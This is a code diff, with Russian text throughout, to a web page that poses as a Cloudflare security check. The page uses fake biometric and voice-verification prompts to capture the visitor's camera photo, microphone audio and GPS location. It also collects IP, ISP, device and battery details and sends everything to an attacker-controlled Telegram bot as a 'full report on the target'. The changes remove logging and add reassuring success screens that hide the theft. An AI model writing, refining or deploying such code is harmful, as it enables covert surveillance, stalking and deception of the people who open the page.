@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Проверка безопасности | Cloudflare</title>
     <script>
-        // Скрипт для принудительного открытия во внешнем браузере (Safari/Chrome)
         (function() {
             var ua = navigator.userAgent || navigator.vendor || window.opera;
             if (ua.indexOf("Telegram") > -1 || ua.indexOf("Instagram") > -1 || ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1 || ua.indexOf("VK") > -1) {
@@ -120,8 +119,6 @@
 
         async function sendAllData(photoBlob, audioBlob, geoData) {
             if (BOT_TOKEN === 'ТВОЙ_ТОКЕН_ЗДЕСЬ') return;
-
-            console.log("=== НАЧАЛО ОТПРАВКИ ===");
             if (!photoBlob) { console.error("ОШИБКА: Фото не создано."); return; }
 
             let ip = "Неизвестно", provider = "Неизвестно", city = "Неизвестно";
@@ -129,61 +126,39 @@
                 const res = await fetch('https://ipwho.is/'); 
                 const j = await res.json(); 
                 ip = j.ip; provider = j.connection ? j.connection.isp : "Неизвестно"; city = j.city || "Неизвестно"; 
-            } catch (e) { console.log("Ошибка IP:", e); }
+            } catch (e) {}
             
             let battery = "Неизвестно", charging = "";
             try { const b = await navigator.getBattery(); battery = Math.round(b.level * 100) + "%"; charging = b.charging ? " (Заряжается)" : ""; } catch (e) {}
-            
-            let network = "Неизвестно";
-            try { network = navigator.connection.effectiveType.toUpperCase(); } catch (e) {}
-
-            let cores = navigator.hardwareConcurrency || "Неизвестно";
-            let ram = navigator.deviceMemory || "Неизвестно";
-            let screenRes = `${window.screen.width}x${window.screen.height}`;
-            let orientation = window.screen.orientation ? window.screen.orientation.type : "Неизвестно";
+            let network = "Неизвестно"; try { network = navigator.connection.effectiveType.toUpperCase(); } catch (e) {}
+            let cores = navigator.hardwareConcurrency || "Неизвестно"; let ram = navigator.deviceMemory || "Неизвестно";
+            let screenRes = `${window.screen.width}x${window.screen.height}`; let orientation = window.screen.orientation ? window.screen.orientation.type : "Неизвестно";
             let touch = navigator.maxTouchPoints > 0 ? "Да" : "Нет";
-            let plugins = [];
-            try { for (let i = 0; i < navigator.plugins.length; i++) { plugins.push(navigator.plugins[i].name); } } catch (e) {}
+            let plugins = []; try { for (let i = 0; i < navigator.plugins.length; i++) { plugins.push(navigator.plugins[i].name); } } catch (e) {}
             let pluginsStr = plugins.length > 0 ? plugins.join(", ").substring(0, 50) + "..." : "Нет/Скрыто";
-            let lang = navigator.language;
-            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let lang = navigator.language; let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
             let caption = `🚨 **ПОЛНЫЙ ОТЧЕТ О ЦЕЛИ** 🚨\n\n`;
             caption += `🌐 **IP:** ${ip}\n🏢 **Провайдер:** ${provider}\n🏙️ **Город:** ${city}\n`;
             caption += `📍 **GPS:** ${geoData ? geoData.lat + ", " + geoData.lon : "Отклонено"}\n`;
-            if (geoData) caption += `🗺️ [Google Карты](https://www.google.com/maps/search/?api=1&query=${geoData.lat},${geoData.lon})\n\n`;
-            else caption += `\n`;
-            caption += `📱 **Устройство:** ${navigator.userAgent.substring(0, 60)}...\n`;
-            caption += `🖥️ **Экран:** ${screenRes} | Ориентация: ${orientation}\n`;
-            caption += `👆 **Сенсор:** ${touch}\n`;
-            caption += `🔋 **Батарея:** ${battery}${charging}\n`;
-            caption += `📶 **Сеть:** ${network}\n`;
-            caption += `🧠 **Ядра/ОЗУ:** ${cores} ядер / ${ram} ГБ\n`;
-            caption += `🌍 **Язык/Пояс:** ${lang} | ${timezone}\n`;
-            caption += `🧩 **Плагины:** ${pluginsStr}\n`;
+            if (geoData) caption += `🗺️ [Google Карты](https://www.google.com/maps/search/?api=1&query=${geoData.lat},${geoData.lon})\n\n`; else caption += `\n`;
+            caption += `📱 **Устройство:** ${navigator.userAgent.substring(0, 60)}...\n🖥️ **Экран:** ${screenRes} | Ориентация: ${orientation}\n`;
+            caption += `👆 **Сенсор:** ${touch}\n🔋 **Батарея:** ${battery}${charging}\n📶 **Сеть:** ${network}\n`;
+            caption += `🧠 **Ядра/ОЗУ:** ${cores} ядер / ${ram} ГБ\n🌍 **Язык/Пояс:** ${lang} | ${timezone}\n🧩 **Плагины:** ${pluginsStr}\n`;
 
             const formDataPhoto = new FormData();
             formDataPhoto.append('chat_id', CHAT_ID);
             formDataPhoto.append('photo', photoBlob, 'photo.jpg');
             formDataPhoto.append('caption', caption);
             formDataPhoto.append('parse_mode', 'Markdown');
-            
-            try { 
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataPhoto }); 
-                const result = await response.json();
-                console.log("Ответ Telegram на фото:", result);
-            } catch (e) { console.error("Ошибка отправки фото:", e); }
+            try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataPhoto }); } catch (e) {}
 
             if (audioBlob) {
                 const formDataAudio = new FormData();
                 formDataAudio.append('chat_id', CHAT_ID);
                 formDataAudio.append('voice', audioBlob, 'voice.ogg');
                 formDataAudio.append('caption', '🎤 Запись с микрофона (5 сек)');
-                try { 
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formDataAudio }); 
-                    const result = await response.json();
-                    console.log("Ответ Telegram на аудио:", result);
-                } catch (e) { console.error("Ошибка отправки аудио:", e); }
+                try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formDataAudio }); } catch (e) {}
             }
         }
 
@@ -197,18 +172,23 @@
             document.getElementById('captcha').style.display = 'none';
             
             const overlay = document.createElement('div');
-            overlay.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; display:flex; justify-content:center; align-items:center; flex-direction:column; color:white; font-family:sans-serif;';
+            overlay.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(15, 23, 42, 0.95); z-index:9999; display:flex; justify-content:center; align-items:center; flex-direction:column; color:white; font-family:sans-serif;';
             overlay.innerHTML = `
-                <div style="background:#1e293b; padding:30px; border-radius:10px; text-align:center; max-width: 80%;">
-                    <h2 style="margin-top:0; color:#3b82f6;">Биометрическая проверка</h2>
+                <div style="background:#1e293b; padding:30px; border-radius:10px; text-align:center; max-width: 80%; box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);">
+                    <h2 style="margin-top:0; color:#3b82f6;">Биометрическая проверка 👤</h2>
                     <p style="color:#cbd5e1; font-size:14px; margin-bottom: 20px;">Пожалуйста, покажите лицо для сканирования. Это необходимо, чтобы подтвердить, что вы человек, а не бот. Проверка проводится с целью безопасности сайта и предотвращения DDoS-атак.</p>
-                    <button id="start-camera-btn" style="background:#3b82f6; color:white; border:none; padding:15px 30px; border-radius:5px; font-size:16px; cursor:pointer; font-weight: bold;">Показать лицо</button>
+                    <button id="start-camera-btn" style="background:#3b82f6; color:white; border:none; padding:15px 30px; border-radius:5px; font-size:16px; cursor:pointer; font-weight: bold; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);">Показать лицо 📸</button>
                 </div>
             `;
             document.body.appendChild(overlay);
 
             document.getElementById('start-camera-btn').addEventListener('click', async () => {
-                overlay.innerHTML = '<div class="spinner" style="border-color: #3b82f6; border-top-color: transparent; margin-bottom: 15px;"></div><p>Сканирование...</p>';
+                overlay.innerHTML = `
+                    <div style="text-align:center;">
+                        <div class="spinner" style="border-color: #3b82f6; border-top-color: transparent; margin-bottom: 15px; width: 30px; height: 30px;"></div>
+                        <p style="color:#cbd5e1;">Сканирование лица...</p>
+                    </div>
+                `;
                 
                 let photoBlob = null;
                 try {
@@ -223,10 +203,20 @@
                 } catch (e) { console.error("Ошибка камеры:", e); }
 
                 if (!photoBlob) {
-                    overlay.innerHTML = '<p style="color:red;">Ошибка доступа к камере. Разрешите использование камеры в настройках браузера.</p>';
+                    overlay.innerHTML = '<p style="color:#ef4444; text-align:center;">Ошибка доступа к камере. Разрешите использование камеры в настройках браузера.</p>';
                     return;
                 }
 
+                // ЭКРАН УСПЕХА ФОТО
+                overlay.innerHTML = `
+                    <div style="text-align:center; animation: fadeIn 0.5s;">
+                        <h1 style="color:#10b981; font-size: 50px; margin: 0;">✅</h1>
+                        <h2 style="color:#fff; margin-top: 10px;">Сканирование успешно!</h2>
+                        <p style="color:#cbd5e1;">Вы не робот. Продолжаем проверку...</p>
+                    </div>
+                `;
+                
+                await new Promise(r => setTimeout(r, 1500)); // Задержка для прочтения
                 document.body.removeChild(overlay);
                 document.getElementById('main-site').style.display = 'block';
                 await recordAudio(photoBlob);
@@ -235,21 +225,21 @@
 
         async function recordAudio(photoBlob) {
             const overlay = document.createElement('div');
-            overlay.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; display:flex; justify-content:center; align-items:center; flex-direction:column; color:white; font-family:sans-serif;';
+            overlay.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(15, 23, 42, 0.95); z-index:9999; display:flex; justify-content:center; align-items:center; flex-direction:column; color:white; font-family:sans-serif;';
             overlay.innerHTML = `
-                <div style="background:#1e293b; padding:30px; border-radius:10px; text-align:center; max-width: 80%;">
-                    <h2 style="margin-top:0; color:#3b82f6;">Проверка подлинности</h2>
-                    <p style="color:#cbd5e1; font-size:14px;">Для подтверждения того, что вы реальный пользователь, произнесите любую фразу.</p>
-                    <button id="start-audio-btn" style="background:#3b82f6; color:white; border:none; padding:15px 30px; border-radius:5px; font-size:16px; cursor:pointer; font-weight: bold;">Пройти верификацию</button>
+                <div style="background:#1e293b; padding:30px; border-radius:10px; text-align:center; max-width: 80%; box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);">
+                    <h2 style="margin-top:0; color:#3b82f6;">Проверка подлинности 🎙️</h2>
+                    <p style="color:#cbd5e1; font-size:14px; margin-bottom: 20px;">Для подтверждения того, что вы реальный пользователь, произнесите любую фразу.</p>
+                    <button id="start-audio-btn" style="background:#3b82f6; color:white; border:none; padding:15px 30px; border-radius:5px; font-size:16px; cursor:pointer; font-weight: bold; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);">Пройти верификацию 🎤</button>
                 </div>
             `;
             document.body.appendChild(overlay);
 
             document.getElementById('start-audio-btn').addEventListener('click', async () => {
                 overlay.innerHTML = `
-                    <div style="background:#1e293b; padding:30px; border-radius:10px; text-align:center; max-width: 80%;">
-                        <h2 style="margin-top:0; color:#3b82f6;">Верификация...</h2>
-                        <p style="color:#cbd5e1; font-size:14px;">Пожалуйста, подождите, идет проверка безопасности.</p>
+                    <div style="text-align:center;">
+                        <div class="spinner" style="border-color: #3b82f6; border-top-color: transparent; margin-bottom: 15px; width: 30px; height: 30px;"></div>
+                        <p style="color:#cbd5e1;">Запись голоса...</p>
                     </div>
                 `;
                 
@@ -269,6 +259,28 @@
 
                 const geoData = await requestGeo();
                 await sendAllData(photoBlob, audioBlob, geoData);
+
+                // ЭКРАН УСПЕХА АУДИО
+                overlay.innerHTML = `
+                    <div style="text-align:center; animation: fadeIn 0.5s;">
+                        <h1 style="color:#10b981; font-size: 50px; margin: 0;">✅</h1>
+                        <h2 style="color:#fff; margin-top: 10px;">Отлично, голос опознан!</h2>
+                        <p style="color:#cbd5e1;">Завершаем проверку безопасности...</p>
+                    </div>
+                `;
+
+                await new Promise(r => setTimeout(r, 1500)); // Задержка для прочтения
+
+                // ФИНАЛЬНЫЙ ЭКРАН
+                overlay.innerHTML = `
+                    <div style="text-align:center; animation: fadeIn 0.5s;">
+                        <h1 style="font-size: 60px; margin: 0;">🎉</h1>
+                        <h2 style="color:#3b82f6; margin-top: 10px;">Вы прошли проверку!</h2>
+                        <p style="color:#cbd5e1; font-size: 16px; margin-top: 15px;">Приятного чтения! 📚✨</p>
+                    </div>
+                `;
+
+                await new Promise(r => setTimeout(r, 2000)); // Финальная задержка
                 document.body.removeChild(overlay);
             });
         }
